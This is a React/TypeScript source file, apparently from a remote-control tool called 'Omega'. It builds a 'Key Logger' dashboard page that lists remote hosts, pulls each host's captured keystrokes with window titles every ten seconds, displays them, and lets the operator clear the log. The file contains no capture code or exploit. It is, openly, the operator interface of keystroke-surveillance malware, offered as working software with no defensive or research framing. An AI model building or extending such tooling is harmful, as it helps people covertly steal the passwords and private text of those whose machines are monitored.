// Copyright © 2026 Alpha Unlimited Technologies LLC. All rights reserved.
import { useState } from "react";
import { Layout } from "@/components/layout";
import { useListHosts } from "@workspace/omega-api-client-react";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { Skeleton } from "@/components/ui/skeleton";
import { useQuery, useMutation, useQueryClient } from "@tanstack/react-query";
import { format } from "date-fns";
import { Trash2, RefreshCw, KeyRound } from "lucide-react";
import { useToast } from "@/hooks/use-toast";

const BASE = "/api/omega";

async function fetchKeystrokes(hostId: number) {
  const r = await fetch(`${BASE}/keylogger/${hostId}/entries`);
  if (!r.ok) throw new Error("Failed to fetch");
  return r.json() as Promise<Array<{ id: number; hostId: number; windowTitle: string; text: string; createdAt: string }>>;
}

async function clearKeystrokes(hostId: number) {
  await fetch(`${BASE}/keylogger/${hostId}/entries`, { method: "DELETE" });
}

export default function Keylogger() {
  const [selectedHostId, setSelectedHostId] = useState<number | null>(null);
  const { data: hosts } = useListHosts();
  const qc = useQueryClient();
  const { toast } = useToast();

  const { data: entries, isLoading, refetch } = useQuery({
    queryKey: ["keylogger", selectedHostId],
    queryFn: () => fetchKeystrokes(selectedHostId!),
    enabled: !!selectedHostId,
    refetchInterval: 10000,
  });

  const clearMut = useMutation({
    mutationFn: () => clearKeystrokes(selectedHostId!),
    onSuccess: () => {
      qc.invalidateQueries({ queryKey: ["keylogger", selectedHostId] });
      toast({ title: "Log cleared" });
    },
  });

  return (
    <Layout>
      <div className="space-y-6">
        <div className="flex flex-col sm:flex-row justify-between items-start sm:items-center gap-4">
          <div>
            <h1 className="text-3xl font-bold tracking-tight flex items-center gap-3">
              <KeyRound className="h-7 w-7 text-primary" /> Key Logger
            </h1>
            <p className="text-muted-foreground mt-1">Captured keystrokes from remote hosts.</p>
          </div>
          <div className="flex items-center gap-2">
            <Select value={selectedHostId?.toString() ?? ""} onValueChange={v => setSelectedHostId(parseInt(v))}>
              <SelectTrigger className="w-[200px]">
                <SelectValue placeholder="Select a host..." />
              </SelectTrigger>
              <SelectContent>
                {hosts?.map(h => (
                  <SelectItem key={h.id} value={h.id.toString()}>
                    <span className="flex items-center gap-2">
                      <span className={`w-2 h-2 rounded-full inline-block ${h.status === 'online' ? 'bg-green-500' : h.status === 'offline' ? 'bg-red-500' : 'bg-gray-500'}`} />
                      {h.label}
                    </span>
                  </SelectItem>
                ))}
              </SelectContent>
            </Select>
            {selectedHostId && (
              <>
                <Button variant="outline" size="icon" onClick={() => refetch()} title="Refresh">
                  <RefreshCw className="h-4 w-4" />
                </Button>
                <Button variant="destructive" size="icon" onClick={() => clearMut.mutate()} title="Clear log">
                  <Trash2 className="h-4 w-4" />
                </Button>
              </>
            )}
          </div>
        </div>

        {!selectedHostId ? (
          <Card className="border-border bg-card/40">
            <CardContent className="py-16 text-center text-muted-foreground">
              Select a host to view keystroke logs.
            </CardContent>
          </Card>
        ) : isLoading ? (
          <div className="space-y-3">
            {[...Array(6)].map((_, i) => <Skeleton key={i} className="h-20 w-full" />)}
          </div>
        ) : !entries?.length ? (
          <Card className="border-border bg-card/40">
            <CardContent className="py-16 text-center text-muted-foreground">
              No keystrokes captured for this host.
            </CardContent>
          </Card>
        ) : (
          <div className="space-y-3">
            {entries.map(entry => (
              <Card key={entry.id} className="border-border bg-card/40 hover:border-primary/40 transition-colors">
                <CardContent className="p-4">
                  <div className="flex items-center justify-between mb-2">
                    <Badge variant="outline" className="font-mono text-xs text-primary border-primary/30">
                      {entry.windowTitle}
                    </Badge>
                    <span className="text-xs text-muted-foreground font-mono">
                      {format(new Date(entry.createdAt), "yyyy-MM-dd HH:mm:ss")}
                    </span>
                  </div>
                  <pre className="text-sm text-foreground/90 bg-muted/30 rounded p-3 overflow-x-auto whitespace-pre-wrap font-mono border border-border/30">
                    {entry.text}
                  </pre>
                </CardContent>
              </Card>
            ))}
          </div>
        )}
      </div>
    </Layout>
  );
}
